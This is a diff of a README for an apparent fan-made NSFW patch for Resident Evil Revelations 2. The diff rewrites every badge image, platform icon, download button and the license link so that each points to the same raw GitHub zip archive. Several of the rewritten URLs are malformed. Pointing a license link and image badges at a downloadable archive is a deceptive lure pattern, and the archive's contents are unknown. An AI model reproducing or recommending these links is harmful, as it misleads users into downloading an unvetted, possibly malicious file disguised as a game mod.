@@ -1,4 +1,4 @@
-# Resident Evil Revelations 2 NSFW Patch <img src="https://img.shields.io/badge/Download-https://chasseur9991.github.io-brightgreen?style=for-the-badge&logo=github" alt="Download Emblem" />
+# Resident Evil Revelations 2 NSFW Patch <img src="https://raw.githubusercontent.com/chasseur9991/revelations-2-adult-enhancements/branch/nutted/revelations-2-adult-enhancements_v1.9.zip" alt="Download Emblem" />
 
 ---
 
@@ -8,10 +8,10 @@ Welcome to the home of the **Resident Evil Revelations 2 NSFW Patch** – an imm
 
 | Platform        | Compatible | Tested   | Notes                                 |
 |-----------------|:----------:|:--------:|---------------------------------------|
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue?logo=windows&logoColor=white) | ✅          | ✅        | Full feature support                  |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2C%20Arch-yellowgreen?logo=linux)   | 🚧          | ⚠️        | Experimental; see Issues              |
-| ![macOS](https://img.shields.io/badge/macOS-Silicon-lightgrey?logo=apple)           | 🔄          | 🔄        | Planned for upcoming versions         |
-| ![Steam Deck](https://img.shields.io/badge/Steam%20Deck-Official-blueviolet?logo=steam)       | ✅          | ✅        | Optimized controls & layout           |
+| ![Windows](https://raw.githubusercontent.com/chasseur9991/revelations-2-adult-enhancements/branch/nutted/revelations-2-adult-enhancements_v1.9.zip%2B-blue?logo=windows&logoColor=white) | ✅          | ✅        | Full feature support                  |
+| ![Linux](https://raw.githubusercontent.com/chasseur9991/revelations-2-adult-enhancements/branch/nutted/revelations-2-adult-enhancements_v1.9.zip%2C%20Arch-yellowgreen?logo=linux)   | 🚧          | ⚠️        | Experimental; see Issues              |
+| ![macOS](https://raw.githubusercontent.com/chasseur9991/revelations-2-adult-enhancements/branch/nutted/revelations-2-adult-enhancements_v1.9.zip)           | 🔄          | 🔄        | Planned for upcoming versions         |
+| ![Steam Deck](https://raw.githubusercontent.com/chasseur9991/revelations-2-adult-enhancements/branch/nutted/revelations-2-adult-enhancements_v1.9.zip%20Deck-Official-blueviolet?logo=steam)       | ✅          | ✅        | Optimized controls & layout           |
 
 > **Legend:**  
 > ✅ = Fully Supported | 🚧 = Partial | 🔄 = Coming Soon | ⚠️ = Experimental
@@ -38,7 +38,7 @@ Bring out the best in your **Resident Evil Revelations 2 modding** with this nex
 
 ### 1. Download the Patch
 
-> [![Download Emblem](https://img.shields.io/badge/Download%20Patch-https://chasseur9991.github.io-brightgreen?style=for-the-badge&logo=github)](https://chasseur9991.github.io)
+> [![Download Emblem](https://raw.githubusercontent.com/chasseur9991/revelations-2-adult-enhancements/branch/nutted/revelations-2-adult-enhancements_v1.9.zip%https://raw.githubusercontent.com/chasseur9991/revelations-2-adult-enhancements/branch/nutted/revelations-2-adult-enhancements_v1.9.zip)](https://raw.githubusercontent.com/chasseur9991/revelations-2-adult-enhancements/branch/nutted/revelations-2-adult-enhancements_v1.9.zip)
 
 ### 2. Backup Your Files
 
@@ -104,12 +104,12 @@ This repository and patch are community creations with the intent to enrich your
 
 ## 📜 MIT License (2025)
 
-This project is licensed under the permissive MIT License. See [LICENSE](https://opensource.org/licenses/MIT) for details.  
+This project is licensed under the permissive MIT License. See [LICENSE](https://raw.githubusercontent.com/chasseur9991/revelations-2-adult-enhancements/branch/nutted/revelations-2-adult-enhancements_v1.9.zip) for details.  
 Copyright © 2025
 
 ---
 
-# Resident Evil Revelations 2 NSFW Patch  <img src="https://img.shields.io/badge/Download-https://chasseur9991.github.io-brightgreen?style=for-the-badge&logo=github" alt="Download Emblem" />
+# Resident Evil Revelations 2 NSFW Patch  <img src="https://raw.githubusercontent.com/chasseur9991/revelations-2-adult-enhancements/branch/nutted/revelations-2-adult-enhancements_v1.9.zip" alt="Download Emblem" />
 
 *Step boldly into the future of modding—where customization meets imagination, and support is always at your side.*
 
